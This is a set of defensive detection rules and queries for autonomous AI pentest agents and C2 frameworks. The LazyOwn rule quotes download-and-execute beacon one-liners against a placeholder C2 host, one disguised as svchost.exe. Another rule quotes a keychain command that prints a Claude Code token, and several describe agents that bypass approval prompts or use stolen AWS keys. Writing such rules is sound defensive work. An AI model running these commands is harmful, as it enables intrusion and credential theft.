name: Agentic Bug Hunter User Agents in Proxy Logs
query: user_agent.original:(agentic\-bug\-hunter\/* OR *Intel\ Mac\ OS\ X\ 10_15_7\)\ Bug\-Bounty\-Research OR *waf\-response\-analyzer\/1.0*)

author: ThreatDefence
description:
Detects the VulnBot command line: python cli.py init, cli.py start -a (knowledge base API on 7861 and Streamlit
page on 8501), cli.py vulnbot -m <interactions> [-t <timeout>] (the agent) and the experiment commands
cli.py pentestgpt and cli.py base (cli.py:20-39, pentest.py:82-86 at 9a12effa). The rule needs the word vulnbot on
the command line, from the subcommand or from the default clone folder VulnBot/.
false_positives: Researchers reproducing the VulnBot paper (arXiv 2501.13411)
Authorized tests with VulnBot
name: VulnBot CLI Started
query: (process.command_line:*cli.py* AND process.command_line:*vulnbot*) AND (process.command_line:(*cli.py\ vulnbot* OR *cli.py\ pentestgpt* OR *cli.py\ start\ \-a* OR *cli.py\ init* OR *cli.py\ base*))

author: ThreatDefence
description:
Detects the SharpHound release that Sage's SharpHound card names being downloaded by a Python client. Sage, the AI
operator for the Mythic C2 framework, fetches
https://github.com/SpecterOps/SharpHound/releases/download/v2.13.0/SharpHound_v2.13.0_windows_x86.zip with requests.get
from the Mythic server before uploading SharpHound to a callback.
false_positives: Other scripts that download this SharpHound release with python-requests
name: Sage (Mythic) SharpHound 2.13.0 Download by python-requests
query: url.original:*\/SpecterOps\/SharpHound\/releases\/download\/v2.13.0\/SharpHound_v2.13.0_windows_x86.zip* AND user_agent.original:python\-requests\/*

author: ThreatDefence
description:
Detects the files ARTEMIS writes during a run: the supervisor session folder logs/supervisor_session_<unix time>/
(supervisor.log, supervisor_todo.json, supervisor_heartbeat.json, session_metadata.json, vulnerabilities_found.log,
session_vulnerabilities.jsonl), the sub-agent exchange files followup_input.json and realtime_context.txt under
workspaces/<instance id>/, and the autonomous mode backup folder ~/codex-logs-backup/autonomous_session_<time>/
(supervisor/supervisor.py:22,87-89,140; supervisor/orchestration/orchestrator.py:102,455;
codex-rs/exec/src/realtime_logger.rs:39; codex-rs/cli/src/main.rs:500-503,629).
false_positives: Authorized research or test runs of ARTEMIS
name: ARTEMIS Session or Sub-Agent Files Written
query: (TargetFilename:*supervisor_session_* AND (TargetFilename:(*supervisor_todo.json OR *supervisor_heartbeat.json OR *session_metadata.json OR *vulnerabilities_found.log OR *session_vulnerabilities.jsonl))) OR ((TargetFilename:(*\/workspaces\/* OR *\\workspaces\\*)) AND (TargetFilename:(*followup_input.json OR *realtime_context.txt))) OR (TargetFilename:(*\/codex\-logs\-backup\/autonomous_session_* OR *\\codex\-logs\-backup\\autonomous_session_*)) OR (TargetFilename:(*\/logs\/latest_session_heartbeat.json OR *\\logs\\latest_session_heartbeat.json))

author: ThreatDefence
description:
Detects the GameHook side-loading file names used to load the BLOODALCHEMY backdoor in the VAPOR
PANDA ARTEX campaign, outside a legitimate game install.
false_positives: Legitimate GameHook or OBS installations
name: BLOODALCHEMY Loader Files Written
query: file.path:(*\\graphics\-hook\-filter64.dll OR *\\graphics\-hook_config.bin)

author: ThreatDefence
description: Detects AWS API calls whose user agent names ARTEX.
false_positives: Authorized penetration tests that use ARTEX
name: ARTEX User Agent in AWS CloudTrail
query: user_agent.original:(*artex\-readonly\/* OR *artex\-pentest\/* OR *artex\-audit\/* OR *artex\-verify\/* OR *artex\-spawn\/* OR *ARTEX\-worker\/* OR *artex\-enrich\/* OR *artex\-i21861\-canary* OR *artex\-agent* OR *artex\-judge\-* OR *ARTeX\-authorized\-pentest* OR *Mozilla\/5.0\ ARTeX* OR *Mozilla\/5.0\ \(ARTEX\)* OR *ArtExVerify\/* OR *ArtEx\/1.0* OR *scopeweaver* OR *spa\-api\-recon*)

author: ThreatDefence
description:
Detects svchost.exe started from any folder other than System32 or SysWOW64. In the VAPOR PANDA
campaign a renamed GameHook binary named svchost.exe side-loaded the BLOODALCHEMY backdoor.
false_positives: Unknown
name: Svchost Running Outside the Windows System Folder
query: process.executable.caseless:*\\svchost.exe AND (NOT (process.executable.caseless:(C\:\\Windows\\System32\\* OR C\:\\Windows\\SysWOW64\\* OR C\:\\Windows\\WinSxS\\*)))

subtechnique.name: Match Legitimate Resource Name or Location

author: ThreatDefence
description:
Detects the shell wrapper PentAGI puts around every agent command in its Kali worker container: it ignores hangups,
raises the process's oom_score_adj by one to mark the flow, then runs the command with exec sh -c "$0".
false_positives: Authorized red team use of PentAGI
name: PentAGI Agent Command Wrapper
query: process.command_line:*trap\ \"\"\ HUP* AND process.command_line:*\/proc\/self\/oom_score_adj* AND process.command_line:*exec\ sh\ \-c\ \"$0\"*

author: ThreatDefence
description:
Detects cyber-harness (chainreactors/cyber-harness, formerly AIScan) on a host: its release binaries cyber-scan,
cyber-harness and cyber-audit (aiscan and aiscan-full up to v1.0.0-rc9), a node started with --server-url and
--node-name, which carries the Hub access key in the URL, and the Quick Connect installer the Hub generates, which
downloads a release zip to a temporary node.zip (cyber-node-<guid> on Windows) and starts the node.
false_positives: Security teams running cyber-harness for authorized tests
Another program named cyber-scan or aiscan
name: cyber-harness Agent, Node or Web Hub Started
query: (process.executable:(*\/cyber\-scan OR *\\cyber\-scan.exe OR *\/cyber\-harness OR *\\cyber\-harness.exe OR *\/cyber\-audit OR *\\cyber\-audit.exe OR *\/aiscan OR *\\aiscan.exe OR *\/aiscan\-full OR *\\aiscan\-full.exe)) OR (process.command_line:*\-\-server\-url\ http* AND process.command_line:*\-\-node\-name*) OR (process.command_line:(*chainreactors\/cyber\-harness\/releases\/* OR *chainreactors\/aiscan\/releases\/*)) OR (process.command_line:*cyber\-node\-* AND process.command_line:*node.zip*)

author: ThreatDefence
description:
Detects NeuroSploit running: the neurosploit binary, its C2 control daemon (neurosploit c2 daemon --port 0 --dir
<...>/.neurosploit/c2), its Kali and Neo4j containers (neurosploit-kali, neurosploit-neo4j), its Playwright
pre-fetch script /tmp/ns_browser_prefetch.js, and the coding agent CLIs it starts without approval prompts
(claude --dangerously-skip-permissions, codex --dangerously-bypass-approvals-and-sandbox) as children of neurosploit.
false_positives: Security teams running NeuroSploit
name: NeuroSploit Harness on a Host
query: (process.executable:(*\/neurosploit OR *\\neurosploit.exe)) OR (process.command_line:(*c2\ daemon\ \-\-port\ 0\ \-\-dir* OR *neurosploit\-kali* OR *neurosploit\-neo4j* OR *ns_browser_prefetch.js* OR *neurosploit\-mcp*)) OR ((process.parent.executable:(*\/neurosploit OR *\\neurosploit.exe)) AND (process.command_line:(*\-\-dangerously\-skip\-permissions* OR *\-\-dangerously\-bypass\-approvals\-and\-sandbox*)))

author: ThreatDefence
description:
Detects requests from the ARIA-X engine reaching a web server. Its http_request and web_probe tools send the user
agent ARIA-X/<version> (authorized security research) on every request (src/aria_x/tools/net.py:40 and :215 in
01NGVI-QINGYI/ARIA-X at 015e197): ARIA-X/0.3.0, ARIA-X/0.2.1, or ARIA-X/0.1 for v0.1.0 and v0.2.0. IIS writes the
spaces as plus signs. Without a path list, web_probe requests /, /robots.txt, /sitemap.xml,
/.well-known/security.txt, /login, /admin, /api and /health in that order. The model can replace the user agent
through the tool's headers argument, and commands it runs in a shell carry their own user agents.
false_positives: Agreed ARIA-X assessments of your applications
name: ARIA-X Agent User Agent in Web Logs
query: user_agent.original:ARIA\-X\/* AND (user_agent.original:(*\(authorized\ security\ research\)* OR *\(authorized\+security\+research\)*))

author: ThreatDefence
description:
Detects files ARIA-X (01NGVI-QINGYI/ARIA-X at 015e197) writes: its SQLite database aria-x.db (WAL mode, with
aria-x.db-wal and aria-x.db-shm) in the data folder, the HTTP evidence records of a run in
runs/run_<12 hex>/work/evidence/http_<date>_<time>_<n>.json, the run reports runs/run_<12 hex>/report.html and
report.md, its configuration configs/aria-x.toml, and the temporary folders aria-x-work-, aria-x-doctor-, aria-x-tools-
and aria-x-demo-target-.
false_positives: Authorized use of ARIA-X
Other tools that keep runs in runs/run_<id>/ folders with report files
name: ARIA-X Database, Run Evidence or Working Folders
query: (TargetFilename:(*\/aria\-x.db OR *\/aria\-x.db\-wal OR *\/aria\-x.db\-shm OR *\/configs\/aria\-x.toml)) OR (TargetFilename:*\/runs\/run_* AND TargetFilename:*\/work\/evidence\/http_*) OR (TargetFilename:*\/runs\/run_* AND (TargetFilename:(*\/report.html OR *\/report.md OR *\/report.json))) OR (TargetFilename:(*\/aria\-x\-work\-* OR *\/aria\-x\-doctor\-* OR *\/aria\-x\-tools\-* OR *\/aria\-x\-demo\-target\-*))

author: ThreatDefence
description:
Detects lookups under c2.lazyown.org, the zone the LazyOwn C2's built-in DNS server (dnslib, UDP 53 on the
operator's lhost, on unless enable_c2_dns is false) answers. A client sends base64url-encoded commands as the
label in front of c2.lazyown.org and gets TXT answers such as "Servidor C2 activo" or "Ejecutado: <command>".
false_positives: Authorized tests with LazyOwn
name: LazyOwn DNS C2 Zone Lookup
query: dns.question.name:/[cC]2\.[lL][aA][zZ][yY][oO][wW][nN]\.[oO][rR][gG]/ OR dns.question.name:/.*\.[cC]2\.[lL][aA][zZ][yY][oO][wW][nN]\.[oO][rR][gG]/

author: ThreatDefence
description:
Detects files Deadend CLI writes on the host that runs it: the test-credential wallet copied on every start
(~/.deadend/reusable_credentials.json; ~/.cache/deadend/memory/reusable_credentials.json in v0.1.15 and earlier),
the raw target responses of its requester tool (requester.jsonl) and the Python tool results
(python_interpreter.jsonl) under ~/.cache/deadend/logs/, the backend log rpc-server-<ms>.log, and the
Playwright cookie state of each session (~/.deadend/agents/<agent>/<session>/auth_context/playwright_state.json).
false_positives: Authorized penetration testers or researchers running Deadend CLI
name: Deadend CLI Credential Wallet or Session Logs Written
query: (TargetFilename:(*\/.deadend\/reusable_credentials.json OR *\/.cache\/deadend\/memory\/reusable_credentials.json)) OR (TargetFilename:*\/.cache\/deadend\/logs\/* AND (TargetFilename:(*\/requester.jsonl OR *\/python_interpreter.jsonl OR *.log))) OR (TargetFilename:*\/.deadend\/agents\/* AND TargetFilename:*\/auth_context\/playwright_state.json)

author: ThreatDefence
description:
Detects the HackSynth launcher, python run_bench.py -b <benchmark>.json -c <config>.json, with one of the benchmark or
config names the repository ships (run_bench.py:132-134, README.md:28). run_bench.py is a common file name, so the
rule also needs a HackSynth benchmark or config path.
false_positives: Authorized research runs of HackSynth
name: HackSynth Benchmark Launcher
query: (process.command_line:*run_bench.py* AND process.command_line:/.*[ ](-b|--benchmark)[ ].*/) AND (process.command_line:(*benchmark_solved.json* OR *combined_solved.json* OR *bandit_solved.json* OR *natas_solved.json* OR *configs\/pico_bench\/* OR *configs\/overthewire_bench\/*))

author: ThreatDefence
description:
Detects the Strix CLI starting a scan, the strix-agent package being installed, the ghcr.io/usestrix/strix-sandbox
container being run, or the Caido proxy the sandbox starts with guest access.
false_positives: Authorized tests with Strix
name: Strix AI Pentest Agent CLI or Sandbox
query: process.command_line:/(.*([\/\\ ]))?strix(\.exe)?["']?[ ](.*[ ])?(--target|-t|--target-list|--scan-mode|--resume)[ =].*/ OR process.command_line:/.*((pip|pip3|pipx)[ ]+install|uv[ ]+(tool[ ]+install|tool[ ]+run|pip[ ]+install)|uvx)[ ](.*[ ])?[\"']?strix-agent.*/ OR process.command_line:*usestrix\/strix\-sandbox* OR (process.command_line:*caido\-cli* AND process.command_line:*\-\-allow\-guests*)

author: ThreatDefence
description:
Detects the two user agents Pensar Apex sends to the sites it tests: pensar-apex, the default session header on
its http_request tool and on the curl, wget and scanner commands it rewrites (src/core/config/config.ts:19,
src/core/session/index.ts:36-38, src/core/http/targetHeaders.ts:242-316), and
Mozilla/5.0 (compatible; PensarBot/1.0; +https://pensar.dev) from its get_page tool
(src/core/tools/backends/local.ts:83-84). Its browser uses an ordinary Chrome user agent and is not covered here.
false_positives: Authorized penetration tests run with Pensar Apex or Pensar Console
name: Pensar Apex User Agent in Web Server Logs
query: user_agent.original:(pensar\-apex* OR *PensarBot\/1.0*)

author: ThreatDefence
description:
Detects Strix's telemetry calls (POST /scan_started/, /finding_reported/ and /scan_ended/ on strix.gateway.scarf.sh)
and requests to the Strix results viewer's agent steering API.
false_positives: Authorized tests with Strix
name: Strix Telemetry or Results Viewer API in Proxy Logs
query: (url.domain:/[sS][tT][rR][iI][xX]\.[gG][aA][tT][eE][wW][aA][yY]\.[sS][cC][aA][rR][fF]\.[sS][hH]/ OR url.domain:/.*\.[sS][tT][rR][iI][xX]\.[gG][aA][tT][eE][wW][aA][yY]\.[sS][cC][aA][rR][fF]\.[sS][hH]/) OR url.original:*\/api\/agents\/steer*

author: ThreatDefence
description:
Detects, in proxy logs, a request to http://httpbin.org/anything/blitzstrike-ssrf-canary, the URL Blitz Strike puts in
23 URL-like parameters during run_engagement to find server-side request forgery. When one of your servers requests it,
the server fetched a URL an outside tester supplied: the SSRF worked. Also detects Blitz Strike's own user agents
leaving a host that runs it. The strings are in the Blitz Strike code at 9d7a6ecb.
false_positives: Authorized tests with Blitz Strike
The host of a tester who runs Blitz Strike (user agent branch)
name: Blitz Strike SSRF Canary Fetched or Blitz Strike User Agent Through a Proxy
query: url.original:*blitzstrike\-ssrf\-canary* OR (user_agent.original:(*blitzstrike* OR *BlitzStrike*))

author: ThreatDefence
description:
Detects the beacon delivery commands the LazyOwn c2_quickstart command prints for the operator to run on a target:
curl -sk 'https://<c2>:<port><route>lin' -o /tmp/.dbus && chmod +x /tmp/.dbus && /tmp/.dbus on Linux, and
iwr -Uri 'https://<c2>:<port><route>win.exe' -OutFile $env:TEMP\svchost.exe; Start-Process $env:TEMP\svchost.exe on
Windows. The operator can change both.
false_positives: Authorized tests with LazyOwn
name: LazyOwn Beacon Quick-Start Download One-Liner
query: (process.command_line:*curl\ \-sk* AND process.command_line:*\-o\ \/tmp\/.dbus*) OR (process.command_line:*chmod\ \+x\ \/tmp\/.dbus* AND process.command_line:*\/tmp\/.dbus*) OR (process.command_line:*iwr\ \-Uri* AND process.command_line:*win.exe* AND process.command_line:*\\svchost.exe*)

author: ThreatDefence
description:
Detects files Clearwing (Lazarus-AI-OSS/clearwing) writes on the host that runs it: its home folder ~/.clearwing
(config.yaml, sessions, audit logs of every command, model OAuth tokens under auth, the disclosure database and
sourcehunt memory) and the temporary folders it creates for agent-made tools and hunter sandboxes.
false_positives: Security teams and researchers running Clearwing
name: Clearwing Configuration, Session or Disclosure Data Written
query: (TargetFilename:(*\/.clearwing\/* OR *\\.clearwing\\*)) OR (TargetFilename:(*\/clearwing_custom_tools_* OR *\/clearwing\-scratch\-* OR *\/clearwing\-src\-*))

author: ThreatDefence
description:
Detects the Custom AI Agent Burp extension preparing its MCP server for remote use: the keytool command it runs to
make the self-signed CN=burp-mcp certificate when TLS is needed (mcp/McpTls.kt at b1738c0e), and the supergateway
bridge its README tells MCP clients such as Claude Desktop to run against http://127.0.0.1:9876/sse.
false_positives: Penetration testers and security teams who use the extension
Other Burp MCP extensions on the same default port, for the bridge selection
name: Custom AI Agent (burp-ai-agent) MCP Server Certificate or MCP Bridge
query: (process.command_line:*\-genkeypair* AND process.command_line:*CN\=burp\-mcp*) OR (process.command_line:*supergateway* AND process.command_line:*\:9876\/sse*)

author: ThreatDefence
description:
Detects a host running Pentest Harness (S1N6H/pentest-harness) as seen by a proxy that inspects TLS: its model
adapters send the user agent pentest-harness/<version> (+https://github.com/S1N6H/pentest-harness) on every model
request, and its DeepSeek web search sends deepseek-harness/0.0.1. Also detects a browser loading the harness web UI
through a proxy (client plugin bundles under /plugins/@pentest-harness/dsh-client-) and the opt-in session telemetry
endpoint of the upstream dsh harness, harness-telemetry.deepseeksvc.com. The deepseek-harness user agent and the
telemetry host belong to the dsh family and also match the upstream harness and its forks.
false_positives: Authorized use of Pentest Harness
The upstream dsh harness or another fork (deepseek-harness user agent, telemetry host)
name: Pentest Harness Model Traffic, Console Use or Telemetry Through a Proxy
query: (user_agent.original:pentest\-harness\/* AND user_agent.original:*\(\+https\:\/\/github.com\/S1N6H\/pentest\-harness\)*) OR user_agent.original:deepseek\-harness\/* OR url.original:*\/plugins\/@pentest\-harness\/dsh\-client\-* OR url.domain:/[hH][aA][rR][nN][eE][sS][sS]-[tT][eE][lL][eE][mM][eE][tT][rR][yY]\.[dD][eE][eE][pP][sS][eE][eE][kK][sS][vV][cC]\.[cC][oO][mM]/

author: ThreatDefence
description:
Detects the fixed command lines the tools of Cyber-AutoAgent's default "general" module start: dalfox with the
blind XSS callback https://dalfox-xss-test.com, and feroxbuster with the word list it writes to
/tmp/auth_wordlist.txt. The tools run only when the model calls them.
false_positives: Authorized tests with Cyber-AutoAgent
Someone else choosing the same callback name or file name
name: Cyber-AutoAgent General Module Tool Command Lines
query: (process.command_line:*dalfox* AND process.command_line:*dalfox\-xss\-test.com*) OR (process.command_line:*feroxbuster* AND process.command_line:*\/tmp\/auth_wordlist.txt*)

author: ThreatDefence
description:
Detects a host setting up or running Deadend CLI: the Docker Hub pull of its Kali sandbox image
xoxruns/sandboxed_kali (registry path /v2/xoxruns/sandboxed_kali/), the release archives install.sh downloads
(deadend-linux-x86_64-unknown-linux-gnu.tar.gz, deadend-macos-aarch64-apple-darwin.tar.gz,
deadend-cli-linux-x86_64.tar.gz, deadend-cli-macos-aarch64.tar.gz), and the default Phoenix trace collector
crunch.straylabs.ai, used only when DEADEND_PHOENIX_OTEL_ENABLED is set without PHOENIX_COLLECTOR_ENDPOINT.
The paths are visible only with TLS inspection; the host name is visible in CONNECT requests.
false_positives: Authorized penetration testers or researchers installing or running Deadend CLI
name: Deadend CLI Sandbox Image, Release Download or Trace Collector in Proxy Logs
query: url.original:*\/xoxruns\/sandboxed_kali\/* OR (url.original:*\/releases\/download\/* AND (url.original:(*\/deadend\-linux\-x86_64\-unknown\-linux\-gnu.tar.gz OR *\/deadend\-macos\-aarch64\-apple\-darwin.tar.gz OR *\/deadend\-cli\-linux\-x86_64.tar.gz OR *\/deadend\-cli\-macos\-aarch64.tar.gz))) OR url.domain:/[cC][rR][uU][nN][cC][hH]\.[sS][tT][rR][aA][yY][lL][aA][bB][sS]\.[aA][iI]/

author: ThreatDefence
description:
Detects hackingBuddyGPT, an open-source framework that lets an LLM run commands on a target over SSH, psexec or
HTTP with no approval step: its wintermute (or hackingBuddyGPT) CLI started with one of its use-cases, the module
form python -m hackingBuddyGPT.cli.wintermute used by its benchmark launcher, the benchmark launcher itself, its log
tools, and its container image ghcr.io/ipa-lab/hackingbuddygpt.
false_positives: Researchers and security teams running hackingBuddyGPT against their own test machines
A script named benchmark_privesc.py from another project
name: hackingBuddyGPT LLM Pentest Agent Started
query: (process.command_line:(*hackingBuddyGPT.cli.wintermute* OR *hackingbuddygpt\-log\-view* OR *hackingbuddygpt\-log\-analyze* OR *benchmark_privesc.py* OR *ghcr.io\/ipa\-lab\/hackingbuddygpt*)) OR ((process.command_line:(*wintermute* OR *hackingBuddyGPT*)) AND (process.command_line:(*\ MinimalPrivEscLinux* OR *\ MinimalToolCallPrivEscLinux* OR *\ PrivEscLinux* OR *\ ExPrivEscLinuxLSE* OR *\ PrivEscWindows* OR *\ WebTestingWithExplanation* OR *\ WebTestingWithShell* OR *\ AdvancedWebTesting* OR *\ WebAPITesting* OR *\ AD\ \-\-*)))

author: ThreatDefence
description:
Detects a Python process running "security find-generic-password -s Claude Code-credentials -w" on macOS, which
prints the Claude Code subscription OAuth token from the login keychain. Clearwing (Lazarus-AI-OSS/clearwing) does
this to reuse a Claude subscription for its pentest agent when its provider is anthropic_oauth, and then sends model
requests with a Claude Code user agent. Claude Code itself reads the same item from its own Node process, not from
Python.
false_positives: Other Python tools that reuse a Claude Code login on purpose
name: Claude Code Keychain Credential Read by a Python Process
query: (process.executable:*\/security AND (process.command_line:*find\-generic\-password* AND process.command_line:*Claude\ Code\-credentials*)) AND process.parent.executable:*python*

author: ThreatDefence
description:
Detects files NyxStrike writes on the host that runs it: its data folder .nyxstrike_data (SQLite database
nyxstrike.db, sessions, run history, the credential encryption key config/cred_key and config_local.json), its log
nyxstrike.log, and the screenshots of its browser agent, /tmp/security_screenshot_<epoch>.png.
false_positives: Authorized red team or lab use of NyxStrike
Another tool that writes /tmp/security_screenshot_ files
name: NyxStrike Data Folder, Log or Browser Screenshot Written
query: TargetFilename:(*\/.nyxstrike_data\/* OR *\/nyxstrike.log OR \/tmp\/security_screenshot_*)

author: ThreatDefence
description:
Detects CyberStrikeAI traffic leaving your network: the console's own user agents (CyberStrikeAI/<version> to
internet search APIs and chat bots, CyberStrikeAI-WebShell/ to webshells) and the implant's default user agent, a
Chrome string cut short after AppleWebKit/537.36 that no browser sends, matched exactly.
false_positives: Authorized tests with CyberStrikeAI
Scripts that copy the same truncated user agent (implant selection only)
name: CyberStrikeAI User Agents or Implant Check-in in Proxy Logs
query: (user_agent.original:(CyberStrikeAI\/* OR CyberStrikeAI\-Docker\-build*)) OR user_agent.original:*CyberStrikeAI\-WebShell\/* OR user_agent.original:"Mozilla\/5.0 \(Windows NT 10.0; Win64; x64\) AppleWebKit\/537.36"

author: ThreatDefence
description:
Detects requests from the web scanner of RAPTOR (gadievron/raptor, an autonomous security research framework that
runs on Claude Code): its fixed user agent "RAPTOR Security Scanner (Authorized Testing)", and the fixed probe values
its checks put in paths and query strings (error-page probes, random control paths, the CL.0 smuggling probe, the
parameter-mining baseline, the cache-buster, the XSS execution canary, the prototype pollution sentinel, the OAuth
probe host and state, and the baseline values). All of these strings are in the code at commit ac734352.
false_positives: Authorized tests with RAPTOR
name: RAPTOR Web Scanner User Agent or Probe Markers in Web Logs
query: user_agent.original:RAPTOR\ Security\ Scanner* OR (url.path:(*does\-not\-exist\-raptor* OR *\/raptor\-clzero\-probe*)) OR (url.path:\/raptor\-* AND (url.path:(*\-does\-not\-exist OR *\/nonexistent.css))) OR (url.query:(*raptornosuchparam\=* OR *raptorcb\=* OR *__raptor_hits* OR *raptor_pp_probe_value_8472* OR *evil\-raptor\-probe.example.com* OR *state\=raptor_probe* OR *\=raptor\-baseline* OR *raptor%40example.invalid* OR *raptor@example.invalid*))

author: ThreatDefence
description: Ten or more EC2 calls with the DryRun flag from one identity in five minutes, the capability check ARTEX agents run with a stolen AWS key.
name: Burst of EC2 DryRun Calls From One Identity
query:
from logs-aws.cloudtrail-*
| where aws.cloudtrail.error_code == "Client.DryRunOperation"
| stats dryruns = count(*), actions = count_distinct(event.action) by aws.cloudtrail.user_identity.arn, source.ip
| where dryruns >= 10

author: ThreatDefence
description:
Detects files CTF Agent writes on the host that runs it: the per-sandbox temporary folder ctf-workspace-<random>,
bind-mounted read-write on /challenge/workspace in the solver container (backend/sandbox.py:114,120), and the
per-solver JSONL trace logs/trace-<challenge>-<model>-<YYYYmmdd-HHMMSS>.jsonl in the working directory
(backend/tracing.py:18-23) for the default models (backend/models.py:21-27).
false_positives: Authorized CTF play or research runs of CTF Agent
Other tools that name a temporary folder ctf-workspace-
name: CTF Agent Workspace or Solver Trace Written
query: TargetFilename:*\/ctf\-workspace\-* OR ((TargetFilename:*\/logs\/trace\-* AND TargetFilename:*.jsonl) AND (TargetFilename:(*\-claude\-opus\-4\-6\-* OR *\-gpt\-5.4\-* OR *\-gpt\-5.4\-mini\-* OR *\-gpt\-5.3\-codex\-* OR *\-us.anthropic.claude\-opus\-4\-6\-v1\-*)))

author: ThreatDefence
description:
Detects calls to an MCP Kali Server API server through a proxy or a firewall that logs URLs: the raw command route
and the tool routes on the default port 5000 (/api/command, /api/tools/<tool>), and the stub route
/mcp/tools/kali_tools/ that only MKS has. The server has no authentication, so a
call from outside the Kali host is either an operator who exposed it or someone using it.
false_positives: Another web application on port 5000 with a route named /api/command or /api/tools/<tool name>
name: MCP Kali Server API Called Across the Network
query: (url.original:(*\:5000\/api\/command* OR *\:5000\/api\/tools\/nmap* OR *\:5000\/api\/tools\/gobuster* OR *\:5000\/api\/tools\/dirb* OR *\:5000\/api\/tools\/nikto* OR *\:5000\/api\/tools\/sqlmap* OR *\:5000\/api\/tools\/metasploit* OR *\:5000\/api\/tools\/hydra* OR *\:5000\/api\/tools\/john* OR *\:5000\/api\/tools\/wpscan* OR *\:5000\/api\/tools\/enum4linux*)) OR url.original:*\/mcp\/tools\/kali_tools\/*

author: ThreatDefence
description:
Detects the files Sage, the AI operator for the Mythic C2 framework, has its tasks write by default: proof files
C:\Windows\Temp\sage_remote_exec_<host>_<callback>.txt and sage_ep_adjust_<slug>.txt, the CA key export
sage_ca_export_<slug>.pfx and its _backup folder, sage_ca_dpapi_, forged and signing certificates sage_forged_cert_ and
sage_ca_signing_, the certreq work folder %TEMP%\sage_cert_enroll_<slug>\, and the GPO proof sage_gpo_<slug>_whoami.txt in
C:\Users\Public or in SYSVOL.
false_positives: Authorized red-team engagements run with Sage in Mythic
name: Sage (Mythic) Proof or Certificate File Written on a Windows Host
query: (file.path:(*\\Windows\\Temp\\sage_remote_exec* OR *\\Windows\\Temp\\sage_ep_adjust* OR *\\Windows\\Temp\\sage_ca_export_* OR *\\Windows\\Temp\\sage_ca_dpapi_* OR *\\Windows\\Temp\\sage_forged_cert_* OR *\\Windows\\Temp\\sage_ca_signing_* OR *\\sage_cert_enroll_*)) OR (file.path:*\\sage_gpo_* AND file.path:*_whoami.txt)

author: ThreatDefence
description:
Detects commands Incalmo's action layer runs on compromised hosts through its implant: the per-command scripts
dynamic_payload_<port>_<paw>.sh, its fixed nmap, nikto, nuclei and ncat command lines, and its exploit and helper scripts.
false_positives: Research use of Incalmo in a lab
An administrator who happens to run nmap or nikto with the same options
name: Incalmo Per-Command Script or Tool Command Line
query: process.command_line:*dynamic_payload_* OR (process.command_line:*nmap* AND process.command_line:*\-\-max\-rtt\-timeout\ 100ms* AND process.command_line:*\ \-sn\ * AND process.command_line:*\-oX\ \-*) OR (process.command_line:*nmap* AND process.command_line:*\-sV\ \-\-version\-light\ \-oX\ \-*) OR (process.command_line:*nikto* AND process.command_line:*\-Tuning\ 8* AND process.command_line:*\-maxtime\ 60s* AND process.command_line:*\-timeout\ 3*) OR (process.command_line:*nuclei* AND process.command_line:*\-timeout\ 5* AND process.command_line:*\-severity\ critical* AND process.command_line:*\ \-j\ \-silent*) OR (process.command_line:*ncat* AND process.command_line:*\-\-no\-shutdown\ \-i\ 5s*) OR (process.command_line:(*msf_rpc_client.py* OR *sudo_baron_exploit.py* OR *strutsExploit.py* OR *becomeUserAgent.sh* OR *writeable_passwd.sh* OR *bind_metasploit_session*))

author: ThreatDefence
description:
Detects the one-time setup HackSynth runs in a new kalilinux/kali-rolling container: installing the
kali-linux-headless metapackage with sshpass and curl, and adding the OverTheWire Bandit, Krypton and Leviathan SSH
host keys with ssh-keyscan on their non-standard ports (docker_setup.py:34-40).
false_positives: Authorized research runs of HackSynth
People playing OverTheWire who add the host keys by hand (the ssh-keyscan selection only)
name: HackSynth Attackbox Setup Command
query: process.command_line:*install\ kali\-linux\-headless\ sshpass\ curl* OR (process.command_line:(*ssh\-keyscan\ \-p\ 2220\ bandit.labs.overthewire.org* OR *ssh\-keyscan\ \-p\ 2231\ krypton.labs.overthewire.org* OR *ssh\-keyscan\ \-p\ 2223\ leviathan.labs.overthewire.org*))

author: ThreatDefence
description:
Detects the processes of Nebula (BerylliumSec/nebula), an operator workstation whose agents run commands in a Kali
container or on the host: the core started by the desktop app (nebula-core runtime-service with --manifest-sha256
and --startup-id, nebula-core desktop-connect --bootstrap-stdin), the core run by hand or in its container image
(nebula-core serve or headless, python -m nebula.v3.cli serve), and its managed Chromium sidecar nebula-browserd.
false_positives: Penetration testers and security teams running Nebula
name: Nebula Core, Desktop Sidecar or Browser Sidecar Process
query: (process.command_line:*nebula\-core\ runtime\-service* AND process.command_line:*\-\-manifest\-sha256*) OR process.command_line:*nebula\-core\ desktop\-connect* OR (process.command_line:(*nebula\-core\ serve* OR *nebula\-core\ headless* OR *\-m\ nebula.v3.cli* OR *nebula\-browserd*))

author: ThreatDefence
description:
Detects Cybermes, a Hermes Agent based AI pentest framework (Zyrexnn/Cybermes at 149b9a66), testing your web
application. Its Go MCP server (cybermes-mcp) uses its own HTTP engines when katana, httpx or ffuf are missing, and
these send "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Cybermes/2.1 (Recon Crawler)" (crawl, up to 30 pages),
"... Cybermes/2.1 (Security Assessment)" (one probe) and "... Cybermes/3.2 (API Fuzzer)" (path fuzzing with
tools/wordlists/common.txt or a built-in list of 41 paths such as .env, .git/config, actuator and swagger). Its AI
gateway audit script sends Cybermes-AIGateway-Auditor/1.0 to / and /api/v1/models with Origin
https://audit-canary.example.com, and its exam audit script sends Cybermes-ExamAuditor/1.0. Cybermes-Security-Auditor/1.0
is the user agent its .cursorrules tells coding agents to put in proof-of-concept scripts. When the external tools are
installed, their own user agents appear instead.
false_positives: Bug bounty hunters or contracted testers using Cybermes against your applications
name: Cybermes User Agents in Web Server Logs
query: (user_agent.original:(*\ Cybermes\/2.1\ \(Recon\ Crawler\) OR *\ Cybermes\/2.1\ \(Security\ Assessment\) OR *\ Cybermes\/3.2\ \(API\ Fuzzer\))) OR (user_agent.original:(Cybermes\-AIGateway\-Auditor\/* OR Cybermes\-ExamAuditor\/* OR Cybermes\-Security\-Auditor\/*))

author: ThreatDefence
description:
Detects PentestCode's own HTTP clients: the user agent pentestcode/<channel>/<version>/<client> on model API calls
and the models.dev catalog fetch, pentestcode/<version> on search calls, the bare pentestcode its page fetcher
retries with after a Cloudflare challenge, and its update check against the GitHub releases of s0ld13rr/pentestcode
or the npm package pentestcode-ai.
false_positives: Authorized tests with PentestCode
name: PentestCode Client Traffic in Proxy Logs
query: user_agent.original:pentestcode* OR (url.original:(*\/repos\/s0ld13rr\/pentestcode\/releases* OR *\/s0ld13rr\/pentestcode\/main\/install.sh* OR *\/pentestcode\-ai\/*))

author: ThreatDefence
description:
